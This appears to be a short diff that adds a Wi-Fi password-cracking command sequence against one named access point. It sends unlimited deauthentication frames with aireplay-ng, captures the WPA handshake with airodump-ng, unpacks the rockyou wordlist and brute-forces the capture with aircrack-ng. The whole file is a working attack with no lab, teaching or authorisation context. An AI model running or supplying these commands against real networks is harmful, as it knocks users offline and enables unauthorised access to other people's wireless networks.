@@ -1,0 +1,4 @@
+aireplay-ng -a 00:3A:9A:C0:A7:A0 --deauth 0 wlan0
+airodump-ng --bssid 00:3A:9A:C0:A7:A0 --channel 12 -w wpa wlan0
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+aircrack-ng wpa-01.cap -w pwdlist.txt
